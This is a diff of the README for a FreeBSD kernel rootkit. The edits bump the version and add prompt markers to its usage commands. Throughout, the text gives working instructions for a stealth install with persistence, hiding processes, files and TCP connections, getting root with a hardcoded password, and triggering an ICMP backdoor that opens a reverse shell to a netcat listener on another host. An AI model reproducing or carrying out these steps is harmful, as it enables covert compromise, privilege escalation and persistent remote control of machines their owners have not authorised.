@@ -1,9 +1,9 @@
 # kld-rootkit
-## A collection of FreeBSD 14.2 rootkit kernel modules and utilities
+## A collection of FreeBSD 14.3 rootkit kernel modules and utilities
 
 **TL;DR ./install_rootkit.sh -s**
 
-This rootkit was developed and tested on FreeBSD 14.2-RELEASE. It is a
+This rootkit was developed and tested on FreeBSD 14.3-RELEASE. It is a
 collection of kernel modules and utilities derived from the examples in
 Joseph Kong's excellent book [DESIGNING BSD ROOTKITS](https://nostarch.com/rootkits.htm), which I highly encourage
 anyone with interest in kernel programming to read.
@@ -61,20 +61,20 @@ Use the "-s" option to install in stealth mode which will avoid printing debug
 messages to the system log and will employ the kernel module hiding and
 persistence capabilities.
 
-    ./install_rootkit.sh -s
+    # ./install_rootkit.sh -s
 
 Running the script without the "-s" option will basically install the rootkit
 in test mode. Debug messages will be written to the console and system log.
 No attempt to hide the kernel modules or achieve persistence will be made.
 
-    ./install_rootkit.sh
+    # ./install_rootkit.sh
 
 An optional argument for the "magic word" can be used as well. This string
 is used as a password to activate some features in this rootkit such as the
 order_66 backdoor and knighted rootshell. This string can also be used as
 part of a file's name to use the file hiding and redirection capabilities.
 
-    ./install_rootkit.sh -s z4xX0n
+    # ./install_rootkit.sh -s z4xX0n
 
 The default "magic word" is "z4xX0n" and will be used in the rest of the examples in this document.
 
@@ -98,7 +98,7 @@ Use the deepbg system call to hide a running process. It takes a PID number as a
 
 To test on a process with PID 1234, run:
 
-    ./bin/interface-deepbg 211 1234
+    $ ./bin/interface-deepbg 211 1234
 
 ### File Hiding
 
@@ -116,7 +116,7 @@ Use the knighted system call with the knight-me utility to gain effective user I
 
 To test with the default "magic word":
 
-    ./bin/knight-me 213 z4xX0n
+    $ ./bin/knight-me 213 z4xX0n
 
 ### TCP Connection Hiding
 
@@ -124,7 +124,7 @@ Use the whisper system call to hide an open TCP connection.
 
 To test hiding an ssh connection to the local port 22 from a foreign port 12345:
 
-    ./bin/interface-whisper 212 22 12345
+    $ ./bin/interface-whisper 212 22 12345
 
 ### Backdoor
 
@@ -140,11 +140,11 @@ netcat (nc) can be used to listen for the inbound connection
 
 For a reverse shell to our target running the order_66 kernel module on *192.168.1.123* start a listener with netcat on *192.168.1.250* and port *5555*
 
-    nc -lnvp 5555
+    $ nc -lnvp 5555
 
 To activate the backdoor from any FreeBSD system, run the trigger program:
 
-    ./bin/trigger 192.168.1.123 192.168.1.250 5555 z4xX0n
+    # ./bin/trigger 192.168.1.123 192.168.1.250 5555 z4xX0n
 
 From the netcat session on the listener (*192.168.1.250*), begin executing commands at the "#" prompt
 
@@ -154,9 +154,9 @@ Alternatively, perl can be used to craft the packet's data buffer and [ nemesis 
 
 From anywhere run:
 
-    echo "z4xX0n" > /tmp/payload
-    perl -e 'print "\xfa\x01\xa8\xc0\x15\xb3"' >> /tmp/payload
-    nemesis icmp -i 5 -c 3 -P /tmp/payload -D 192.168.1.123
+    $ echo "z4xX0n" > /tmp/payload
+    $ perl -e 'print "\xfa\x01\xa8\xc0\x15\xb3"' >> /tmp/payload
+    # nemesis icmp -i 5 -c 3 -P /tmp/payload -D 192.168.1.123
 
 From the netcat session on the listener (*192.168.1.250*), begin executing commands at the "#" prompt
 
@@ -168,11 +168,11 @@ Persistence through reboot is achieved by creating a copy of the */etc/defaults/
   
 To disable the rootkit after installing in test mode, run the "kldloadall.sh" script located in the top level directory of this repo with the "-u" option.
 
-    ./kldloadall.sh -u
+    # ./kldloadall.sh -u
   
 To disable the rootkit after installing in stealth mode, boot into single user mode and update the default rc.conf file. See the following example for a zfs file system:
   
-    zfs set readonly=off zroot
-    zfs mount -a
-    cp -f /etc/defaults/rc.conf.z4xX0n /etc/defaults/rc.conf
-    exit
+    # zfs set readonly=off zroot
+    # zfs mount -a
+    # cp -f /etc/defaults/rc.conf.z4xX0n /etc/defaults/rc.conf
+    # exit
